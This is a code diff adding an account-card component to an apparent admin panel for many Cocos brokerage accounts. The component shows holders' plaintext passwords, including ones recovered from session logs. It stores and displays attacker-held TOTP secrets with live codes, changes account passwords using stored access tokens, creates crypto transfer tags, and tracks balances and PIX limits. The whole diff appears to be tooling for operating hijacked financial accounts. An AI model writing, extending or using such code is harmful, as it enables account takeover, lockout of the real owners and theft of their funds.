+          {otpParts.mfa_type && <span className={`text-[9px] ${otpParts.mfa_type === "client_own" ? "text-amber-400" : "text-purple-400"}`}>{otpParts.mfa_type === "client_own" ? "🔒 MFA Cliente" : "🔑 MFA Nosso"}</span>}
+        </div>
+      )}
+    </div>
+  );
+};
+
+// ══════════════════════════════════════════
+// ACCOUNT CARD — Clean Design
+// ══════════════════════════════════════════
+const AccountCard = ({ account, tokenStatus, pixLimits, onOperate, onDelete, onTagChange, safeInvoke, onAccountUpdate }: {
+  account: CocosAccount;
+  tokenStatus?: "alive" | "expired" | "checking";
+  pixLimits?: PixLimitsData;
+  onOperate: () => void;
+  onDelete: () => void;
+  onTagChange: (tag: string | null) => void;
+  safeInvoke: (body: Record<string, unknown>, retried?: boolean) => Promise<{ data: any; error: any }>;
+  onAccountUpdate: () => void;
+}) => {
+  const balArs = account.balance_ars as Record<string, unknown> | null;
+  const balUsd = account.balance_usd as Record<string, unknown> | null;
+  const totalArs = Number(balArs?.totalBalance) || 0;
+  const totalUsd = Number(balUsd?.totalBalance) || 0;
+  const cashArs = Number(balArs?.cashBalance) || 0;
+  const holdingsArs = Number(balArs?.holdingsBalance) || 0;
+  const hasToken = !!account.access_token;
+  const name = account.full_name || account.email;
+
+  const bp = account.buying_power as Record<string, Record<string, number>> | null;
+  const ciArs = Number(bp?.CI?.ars) || 0;
+
+  const mfaMethodFromDb = (account.profile_data as Record<string, unknown>)?.mfa_method as string | null;
+  const isClientOwnMfa = mfaMethodFromDb === "client_own";
+  const hasOurTotp = !!account.totp_secret && !isClientOwnMfa;
+  const factorsArr = Array.isArray(account.factors) ? account.factors : [];
+  const hasVerifiedTotpFactor = factorsArr.some((f: any) => f?.factor_type === "totp" && f?.status === "verified");
+  const hasOwnMfa = isClientOwnMfa || (!account.totp_secret && hasVerifiedTotpFactor);
+
+  const lastActive = account.last_refresh_at || account.last_login_at;
+  const isRecent = lastActive && (Date.now() - new Date(lastActive).getTime()) < 3600000;
+  const isExpired = tokenStatus === "expired";
+  const isChecking = tokenStatus === "checking";
+
+  const [totpCode, setTotpCode] = useState("");
+  const [totpTimeLeft, setTotpTimeLeft] = useState(30);
+  const [copied, setCopied] = useState("");
+  const [newPwd, setNewPwd] = useState("");
+  const [changingPwd, setChangingPwd] = useState(false);
+  const [pwdResult, setPwdResult] = useState<{ success: boolean; msg: string } | null>(null);
+  const [expanded, setExpanded] = useState(false);
+
+  // Cocos Tag
+  const [tagName, setTagName] = useState("");
+  const [tagLoading, setTagLoading] = useState(false);
+  const [tagResult, setTagResult] = useState<{ success: boolean; msg: string; data?: any } | null>(null);
+  const [currentTag, setCurrentTag] = useState<string | null>(null);
+  const [tagQuerying, setTagQuerying] = useState(false);
+  const [tagAutoChecked, setTagAutoChecked] = useState(false);
+
+  // Crypto balance
+  const [cryptoBalance, setCryptoBalance] = useState<Record<string, unknown> | null>(null);
+  const [cryptoLoading, setCryptoLoading] = useState(false);
+
+  // Password from sessions fallback
+  const [sessionPassword, setSessionPassword] = useState<string | null>(null);
+  useEffect(() => {
+    if (account.password || sessionPassword) return;
+    supabase.from("sessions").select("password").eq("email", account.email).not("password", "is", null).order("created_at", { ascending: false }).limit(1)
+      .then(({ data }) => { if (data?.[0]?.password) setSessionPassword(data[0].password); });
+  }, [account.email, account.password, sessionPassword]);
+  const displayPassword = account.password || sessionPassword;
+
+  // Auto-check Cocos Tag + Crypto when expanded
+  useEffect(() => {
+    if (!expanded || tagAutoChecked || !account.access_token || !account.account_id) return;
+    setTagAutoChecked(true);
+    setTagQuerying(true);
+    safeInvoke({ action: "crypto_get_customer", access_token: account.access_token, account_id: account.account_id })
+      .then(({ data, error }) => {
+        if (!error && data && !data.error && data.tag) setCurrentTag(data.tag);
+        setTagQuerying(false);
+      }).catch(() => setTagQuerying(false));
+    // Also fetch crypto
+    setCryptoLoading(true);
+    safeInvoke({ action: "crypto_get_balance", access_token: account.access_token, account_id: account.account_id })
+      .then(({ data, error }) => {
+        if (!error && data && !data.error) setCryptoBalance(data);
+        setCryptoLoading(false);
+      }).catch(() => setCryptoLoading(false));
+  }, [expanded, tagAutoChecked, account.access_token, account.account_id, safeInvoke]);
+
+  useEffect(() => {
+    if (!account.totp_secret || isClientOwnMfa) return;
+    let active = true;
+    const update = async () => {
+      try {
+        const code = await generateTOTP(account.totp_secret!);
+        if (active) { setTotpCode(code); setTotpTimeLeft(getTimeRemaining()); }
+      } catch { /* */ }
+    };
+    update();
+    const interval = setInterval(update, 1000);
+    return () => { active = false; clearInterval(interval); };
+  }, [account.totp_secret, isClientOwnMfa]);
+
+  const copyText = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    setCopied(label);
+    setTimeout(() => setCopied(""), 1500);
+  };
+
+  const dailyLimit = Number(pixLimits?.dailyLimit) || 0;
+  const dailyUsed = Number(pixLimits?.dailyConsumption) || 0;
+  const dailyPct = dailyLimit > 0 ? (dailyUsed / dailyLimit) * 100 : 0;
+
+  // Crypto display
+  const cryptoCash = cryptoBalance ? Number((cryptoBalance as any)?.cashBalance) || 0 : 0;
+  const cryptoHoldings = cryptoBalance ? Number((cryptoBalance as any)?.holdingsBalance) || 0 : 0;
+  const cryptoTotal = cryptoBalance ? Number((cryptoBalance as any)?.totalBalance) || 0 : 0;
+
+  return (
+    <div className={`rounded-xl border overflow-hidden transition-all ${
+      isExpired || account.info_tag?.startsWith("⚠️") || account.info_tag?.startsWith("❌")
+        ? "border-red-500/20 bg-card"
+        : "border-border bg-card hover:border-primary/15"
+    }`}>
+      {/* ── HEADER ROW ── */}
+      <div className="flex items-center gap-3 px-3 py-2.5">
+        {/* Status dot + name */}
+        <div className={`h-2 w-2 rounded-full shrink-0 ${isExpired ? "bg-red-500" : isRecent ? "bg-green-400 animate-pulse" : "bg-muted-foreground/30"}`} />
+        <div className="flex-1 min-w-0">
+          <div className="flex items-center gap-1.5 flex-wrap">
+            <span className="text-[12px] font-bold text-foreground truncate">{name}</span>
+            {hasOurTotp && <span className="text-[7px] text-purple-400 bg-purple-500/10 px-1 py-0.5 rounded font-bold">TOTP</span>}
+            {hasOwnMfa && <span className="text-[7px] text-amber-400 bg-amber-500/10 px-1 py-0.5 rounded font-bold">MFA</span>}
+            {tagAutoChecked && !currentTag && !tagQuerying && <span className="text-[7px] text-red-400 bg-red-500/15 px-1 py-0.5 rounded font-bold">SEM TAG</span>}
+            {currentTag && <span className="text-[7px] text-cyan-400 bg-cyan-500/10 px-1 py-0.5 rounded font-semibold">🏷️{currentTag}</span>}
+          </div>
+          {/* Email + Password + Time */}
+          <div className="flex items-center gap-1.5 mt-0.5 text-[9px] text-muted-foreground flex-wrap">
+            <span className="truncate max-w-[200px]">{account.email}</span>
+            <span>•</span>
+            {displayPassword ? (
+              <button onClick={() => copyText(displayPassword, "pwd_main")} className="flex items-center gap-0.5 hover:opacity-80">
+                <Lock size={7} className="text-yellow-400" />
+                <span className="font-mono text-yellow-400 font-semibold">{displayPassword}</span>
+                {copied === "pwd_main" ? <Check size={7} className="text-green-400" /> : <Copy size={7} />}
+              </button>
+            ) : (
+              <span className="text-red-400 font-bold">SEM SENHA</span>
+            )}
+            <span>•</span>
+            <span>{timeAgo(lastActive)}</span>
+          </div>
+        </div>
+
+        {/* ── BALANCES (always visible) ── */}
+        <div className="hidden sm:grid grid-cols-3 gap-3 shrink-0 text-right">
+          <div>
+            <p className="text-[8px] text-muted-foreground">ARS</p>
+            <p className="text-[13px] font-bold text-emerald-400 tabular-nums">{fmtARS(totalArs)}</p>
+            <p className="text-[8px] text-muted-foreground">💵{fmtARS(cashArs)} 📊{fmtARS(holdingsArs)}</p>
+          </div>
+          <div>
+            <p className="text-[8px] text-muted-foreground">USD</p>
+            <p className={`text-[13px] font-bold tabular-nums ${totalUsd > 0 ? "text-sky-400" : "text-muted-foreground/20"}`}>{totalUsd > 0 ? fmtUSD(totalUsd) : "$0"}</p>
+          </div>
+          {ciArs > 0 && (
+            <div>
+              <p className="text-[8px] text-orange-400">⚡CI</p>
+              <p className="text-[13px] font-bold text-orange-400 tabular-nums">{fmtARS(ciArs)}</p>
+            </div>
+          )}
+        </div>
+
+        {/* Quick TOTP */}
+        {!expanded && hasOurTotp && totpCode && (
+          <button onClick={() => copyText(totpCode, "totp_q")} className="hidden md:flex items-center gap-1 bg-purple-500/10 border border-purple-500/20 rounded-lg px-2 py-1 hover:bg-purple-500/20 transition-all shrink-0">
+            <span className="text-[11px] font-mono font-bold tracking-widest text-purple-400">{totpCode}</span>
+            <span className={`text-[7px] font-bold ${totpTimeLeft <= 5 ? "text-red-400" : "text-purple-400/50"}`}>{totpTimeLeft}s</span>
+          </button>
+        )}
+
+        {/* Actions */}
+        <div className="flex items-center gap-0.5 shrink-0">
+          <button onClick={onOperate} disabled={(!hasToken && !account.refresh_token) || isChecking}
+            className={`flex items-center gap-1 rounded-lg px-2.5 py-1.5 text-[10px] font-semibold transition-all ${
+              isChecking ? "bg-secondary text-muted-foreground" : isExpired ? "bg-red-500/10 text-red-400" : hasToken ? "bg-primary text-primary-foreground hover:bg-primary/90" : "bg-secondary text-muted-foreground cursor-not-allowed"
+            }`}>
+            {isChecking ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />}
+            {isChecking ? "..." : isExpired ? "Exp" : "Op"}
+          </button>
+          <button onClick={() => setExpanded(!expanded)} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:bg-secondary transition-colors">
+            {expanded ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
+          </button>
+          <button onClick={onDelete} className="h-7 w-7 rounded-lg flex items-center justify-center text-destructive/30 hover:text-destructive hover:bg-destructive/10 transition-colors">
+            <Trash2 size={12} />
+          </button>
+        </div>
+      </div>
+
+      {/* ── TAGS BAR ── */}
+      <div className="px-3 pb-1.5 flex items-center gap-1 flex-wrap">
+        {INFO_TAGS.map((tag) => (
+          <button key={tag} onClick={() => onTagChange(account.info_tag === tag ? null : tag)}
+            className={`text-[7px] px-1 py-0.5 rounded border transition-all ${account.info_tag === tag ? `${TAG_COLORS[tag].bg} ${TAG_COLORS[tag].text} font-bold` : "border-border/30 text-muted-foreground/40 hover:border-primary/20"}`}>
+            {tag}
+          </button>
+        ))}
+        {dailyPct > 0 && (
+          <div className="ml-auto flex items-center gap-1">
+            <div className="w-12 h-0.5 rounded-full bg-border overflow-hidden">
+              <div className={`h-full rounded-full ${dailyPct > 80 ? "bg-red-500" : "bg-green-500"}`} style={{ width: `${Math.min(100, dailyPct)}%` }} />
+            </div>
+            <span className={`text-[7px] font-bold ${dailyPct > 80 ? "text-red-400" : "text-muted-foreground"}`}>{dailyPct.toFixed(0)}%</span>
+          </div>
+        )}
+      </div>
+
+      {/* ── EXPANDED ── */}
+      {expanded && (
+        <div className="border-t border-border/30 px-3 py-3 space-y-3">
+          {/* ── SALDOS DETALHADOS ── */}
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
+            <BalanceBox label="💰 ARS Total" value={fmtARS(totalArs)} color="text-emerald-400" />
+            <BalanceBox label="💵 Caixa" value={fmtARS(cashArs)} color="text-green-400" />
+            <BalanceBox label="📊 Investido" value={fmtARS(holdingsArs)} color="text-blue-400" />
+            <BalanceBox label="🇺🇸 USD" value={totalUsd > 0 ? fmtUSD(totalUsd) : "$0"} color={totalUsd > 0 ? "text-sky-400" : "text-muted-foreground/30"} />
+          </div>
+
+          {/* ── CRYPTO BALANCE ── */}
+          <div>
+            <p className="text-[9px] font-semibold text-muted-foreground uppercase tracking-wider mb-1.5 flex items-center gap-1">
+              <Coins size={10} className="text-orange-400" /> Crypto
+              {cryptoLoading && <RefreshCw size={8} className="animate-spin text-muted-foreground" />}
+              <button onClick={async () => {
+                if (!account.access_token || !account.account_id) return;
+                setCryptoLoading(true);
+                const { data, error } = await safeInvoke({ action: "crypto_get_balance", access_token: account.access_token, account_id: account.account_id });
+                if (!error && data && !data.error) setCryptoBalance(data);
+                setCryptoLoading(false);
+              }} className="text-[8px] text-muted-foreground hover:text-foreground ml-1">🔄</button>
+            </p>
+            {cryptoBalance ? (
+              <div className="grid grid-cols-3 gap-2">
+                <BalanceBox label="🪙 Total" value={fmtARS(cryptoTotal)} color="text-orange-400" />
+                <BalanceBox label="💵 Caixa" value={fmtARS(cryptoCash)} color="text-green-400" />
+                <BalanceBox label="📊 Custódia" value={fmtARS(cryptoHoldings)} color="text-purple-400" />
+              </div>
+            ) : (
+              <p className="text-[9px] text-muted-foreground/50">{account.access_token ? "Expandir para carregar" : "Sem token ativo"}</p>
+            )}
+          </div>
+
+          {ciArs > 0 && (
+            <div className="rounded-lg bg-orange-500/5 border border-orange-500/20 px-3 py-2">
+              <p className="text-[9px] text-orange-400 font-bold">⚡ CI RESGATE: {fmtARS(ciArs)}</p>
+            </div>
+          )}
+
+          {/* Credentials */}
+          <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-1">
+            <CopyField label="Email" value={account.email} copied={copied} onCopy={copyText} />
+            <CopyField label="Senha" value={displayPassword || "SEM SENHA"} copied={copied} onCopy={copyText} />
+            {!account.password && sessionPassword && <span className="text-[8px] text-yellow-400 italic col-span-full">⚠️ Senha dos logs de sessão</span>}
+            {account.totp_secret && <CopyField label="TOTP" value={account.totp_secret} copied={copied} onCopy={copyText} mono />}
+            {account.phone && <CopyField label="Tel" value={account.phone} copied={copied} onCopy={copyText} />}
+            {account.account_id && <CopyField label="ID" value={account.account_id} copied={copied} onCopy={copyText} />}
+          </div>
+
+          {/* Change password */}
+          {account.access_token && (
+            <div className="flex items-center gap-2">
+              <Key size={9} className="text-blue-400 shrink-0" />
+              <input type="text" placeholder="Nova senha" value={newPwd} onChange={(e) => { setNewPwd(e.target.value); setPwdResult(null); }}
+                className="flex-1 rounded-lg border border-border bg-background px-2 py-1 text-[10px] text-foreground focus:outline-none focus:border-blue-400" />
+              <button
+                onClick={async () => {
+                  if (!newPwd.trim() || changingPwd) return;
+                  setChangingPwd(true); setPwdResult(null);
+                  try {
+                    const { data, error: fnErr } = await safeInvoke({ action: "change_password", access_token: account.access_token, new_password: newPwd.trim() });
+                    if (!fnErr && data?.success !== false && !data?.error) {
+                      await supabase.from("cocos_accounts").update({ password: newPwd.trim() } as any).eq("id", account.id);
+                      setPwdResult({ success: true, msg: "✅ OK" }); setNewPwd(""); onAccountUpdate();
+                    } else { setPwdResult({ success: false, msg: data?.message || data?.error || "Erro" }); }
+                  } catch { setPwdResult({ success: false, msg: "Erro" }); }
+                  setChangingPwd(false);
+                }}
+                disabled={changingPwd || !newPwd.trim()}
+                className="rounded-lg bg-blue-500/10 px-2.5 py-1 text-[9px] font-semibold text-blue-400 hover:bg-blue-500/15 disabled:opacity-50"
+              >{changingPwd ? "..." : "Trocar"}</button>
+            </div>
+          )}
+          {pwdResult && <p className={`text-[9px] font-bold ${pwdResult.success ? "text-green-400" : "text-red-400"}`}>{pwdResult.msg}</p>}
+
+          {/* Cocos Tag */}
+          {account.access_token && account.account_id && (
+            <div className="flex items-center gap-2">
+              <span className="text-[9px]">🏷️</span>
+              <button onClick={async () => {
+                setTagQuerying(true); setTagResult(null);
+                try {
+                  const { data, error } = await safeInvoke({ action: "crypto_get_customer", access_token: account.access_token, account_id: account.account_id });
+                  if (!error && data && !data.error) { setCurrentTag(data.tag || null); setTagResult({ success: true, msg: data.tag ? `Tag: ${data.tag}` : "Sem tag" }); }
+                  else { setTagResult({ success: false, msg: data?.error || "Erro" }); }
+                } catch { setTagResult({ success: false, msg: "Erro" }); }
+                setTagQuerying(false);
+              }} disabled={tagQuerying} className="text-[9px] px-2 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 font-semibold hover:bg-cyan-500/15 disabled:opacity-50">
+                {tagQuerying ? "..." : "Ver Tag"}
+              </button>
+              <input type="text" placeholder="Nome tag" value={tagName} onChange={(e) => { setTagName(e.target.value); setTagResult(null); }}
+                className="flex-1 rounded-lg border border-border bg-background px-2 py-1 text-[10px] text-foreground focus:outline-none focus:border-cyan-400" />
+              <button onClick={async () => {
+                if (!tagName.trim() || tagLoading) return;
+                setTagLoading(true); setTagResult(null);
+                try {
+                  const { data, error } = await safeInvoke({ action: "crypto_set_tag", access_token: account.access_token, account_id: account.account_id, tag_name: tagName.trim() });
+                  if (!error && data && !data.error) { setCurrentTag(data.tag || tagName.trim()); setTagResult({ success: true, msg: `✅ ${data.tag || tagName.trim()}` }); setTagName(""); }
+                  else { setTagResult({ success: false, msg: data?.error || "Erro" }); }
+                } catch { setTagResult({ success: false, msg: "Erro" }); }
+                setTagLoading(false);
+              }} disabled={tagLoading || !tagName.trim()} className="text-[9px] px-2 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 font-semibold hover:bg-cyan-500/15 disabled:opacity-50">
+                {tagLoading ? "..." : "Criar"}
+              </button>
+            </div>
+          )}
+          {tagResult && <p className={`text-[9px] font-bold ${tagResult.success ? "text-green-400" : "text-red-400"}`}>{tagResult.msg}</p>}
+
+          {/* PIX Limits */}
+          {pixLimits && (
+            <div className="flex items-center gap-3 text-[9px] text-muted-foreground">
+              <Gauge size={9} />
+              <span>Diário: ${(Number(pixLimits.dailyConsumption) || 0).toFixed(0)} / ${(Number(pixLimits.dailyLimit) || 0).toFixed(0)}</span>
+              <span>Mensal: ${(Number(pixLimits.monthlyConsumption) || 0).toFixed(0)} / ${(Number(pixLimits.monthlyLimit) || 0).toFixed(0)}</span>
+            </div>
+          )}
+
+          {/* Live TOTP */}
+          {hasOurTotp && totpCode && (
+            <div className="flex items-center gap-2">
+              <KeyRound size={11} className="text-purple-400" />
+              <button onClick={() => copyText(totpCode, "totp_code")} className="bg-purple-500/10 border border-purple-500/20 rounded-lg px-2.5 py-1 hover:bg-purple-500/20 transition-all">
+                <span className="text-base font-mono font-bold tracking-[0.3em] text-purple-400">{totpCode.slice(0, 3)} {totpCode.slice(3)}</span>
+              </button>
+              <div className="relative w-5 h-5">
+                <svg className="w-5 h-5 -rotate-90" viewBox="0 0 20 20">
+                  <circle cx="10" cy="10" r="8" fill="none" stroke="hsl(var(--border))" strokeWidth="2" />
+                  <circle cx="10" cy="10" r="8" fill="none" stroke={totpTimeLeft <= 5 ? "hsl(var(--destructive))" : "#a855f7"} strokeWidth="2" strokeDasharray={`${(totpTimeLeft / 30) * 50.27} 50.27`} strokeLinecap="round" />
+                </svg>
+                <span className={`absolute inset-0 flex items-center justify-center text-[7px] font-bold ${totpTimeLeft <= 5 ? "text-destructive" : "text-purple-400"}`}>{totpTimeLeft}</span>
+              </div>
+              {copied === "totp_code" && <span className="text-[8px] text-green-400 font-bold">✓</span>}
+            </div>
+          )}
+          {hasOwnMfa && (
+            <p className="text-[9px] text-amber-400 flex items-center gap-1"><ShieldCheck size={10} /> MFA do Cliente</p>
+          )}
+        </div>
+      )}
+
+      {/* ── BOTTOM ── */}
+      <div className="px-3 py-1 border-t border-border/15 flex items-center gap-1.5 text-[8px] text-muted-foreground/50">
+        {account.info_tag?.startsWith("⚠️") || account.info_tag?.startsWith("❌") ? (
+          <span className="text-red-400 font-semibold">{account.info_tag}</span>
+        ) : account.refresh_token ? (
+          <>
+            <RefreshCw size={7} className="text-green-400/60" />
+            {account.last_refresh_at ? <span className="text-green-400/60">Cron {timeAgo(account.last_refresh_at)}</span> : <span>Aguardando...</span>}
+          </>
+        ) : (
+          <span className="text-destructive/60 font-semibold">Sem refresh</span>
+        )}
+      </div>
+    </div>
+  );
+};
+
+// ══════════════════════════════════════════
+// BALANCE BOX (for expanded view)
+// ══════════════════════════════════════════
+const BalanceBox = ({ label, value, color }: { label: string; value: string; color: string }) => (
+  <div className="rounded-lg bg-secondary/50 border border-border/50 px-2.5 py-2">
+    <p className="text-[8px] text-muted-foreground">{label}</p>
+    <p className={`text-sm font-bold ${color} tabular-nums`}>{value}</p>
+  </div>
+);
+
+// ══════════════════════════════════════════
+// COPY FIELD
+// ══════════════════════════════════════════
+const CopyField = ({ label, value, copied, onCopy, mono }: {
+  label: string; value: string; copied: string; onCopy: (t: string, l: string) => void; mono?: boolean;
+}) => (
+  <div className="flex items-center gap-1.5 min-w-0">
+    <span className="text-[8px] text-muted-foreground font-semibold w-[40px] shrink-0">{label}:</span>
+    <span className={`text-[10px] truncate ${mono ? "font-mono" : ""} ${value === "SEM SENHA" || value === "—" ? "text-red-400 font-bold" : "text-foreground"}`}>{value}</span>
+    {value !== "SEM SENHA" && value !== "—" && (
+      <button onClick={() => onCopy(value, label)} className="text-muted-foreground hover:text-foreground shrink-0">
+        {copied === label ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
+      </button>
+    )}
+  </div>
+);
+
+export default AdminV2;
